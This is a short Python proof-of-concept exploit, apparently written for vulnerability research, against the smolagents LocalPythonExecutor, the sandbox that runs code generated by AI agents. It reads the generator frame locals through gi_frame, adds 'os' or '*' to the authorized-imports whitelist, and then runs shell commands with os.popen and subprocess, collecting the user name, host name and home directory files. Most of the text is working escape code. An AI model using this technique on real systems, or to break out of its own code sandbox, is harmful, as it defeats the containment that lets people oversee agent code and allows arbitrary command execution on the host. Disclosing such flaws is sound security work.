#!/Users/jooy/claude/smolagents_venv/bin/python3
"""
smolagents LocalPythonExecutor — MINIMAL RCE PoC

Vulnerability: Generator frame locals leak allows modification of
authorized_imports whitelist, enabling arbitrary module import.

3-line exploit:
1. Create generator → access gi_frame → f_locals → authorized_imports
2. Append "*" to authorize all imports
3. Import os/subprocess for arbitrary code execution

Usage:
  smolagents_venv/bin/python3 smolagents_research/poc/test_14_minimal_rce_poc.py
  OR: pip install smolagents && python3 test_14_minimal_rce_poc.py
"""
import sys
sys.path.insert(0, '/Users/jooy/claude/smolagents/src')
from smolagents.local_python_executor import LocalPythonExecutor

e = LocalPythonExecutor(additional_authorized_imports=[])
e.send_tools({})

# === MINIMAL 3-LINE RCE ===
EXPLOIT = '''
(x for x in [1]).gi_frame.f_locals["authorized_imports"].append("os")
import os
os.popen("id").read()
'''



result = e(EXPLOIT)
print(f"\nCommand output: {result.output}")
print(f"Logs: {result.logs}")

# === COMPREHENSIVE IMPACT DEMO ===
print("\n" + "=" * 60)
print("Impact Demonstration")
print("=" * 60)

# Reset executor
e2 = LocalPythonExecutor(additional_authorized_imports=[])
e2.send_tools({})

IMPACT = '''
# Step 1: Escape sandbox
(x for x in [1]).gi_frame.f_locals["authorized_imports"].append("*")

# Step 2: Import dangerous modules
import os
import subprocess
import socket

# Step 3: Demonstrate impact
results = {}
results["whoami"] = subprocess.check_output(["whoami"]).decode().strip()
results["hostname"] = socket.gethostname()
results["cwd"] = os.getcwd()
results["home_files"] = os.listdir(os.path.expanduser("~"))[:5]
results["python_path"] = subprocess.check_output(["which", "python3"]).decode().strip()
results
'''

result2 = e2(IMPACT)
print(f"\nImpact results: {result2.output}")
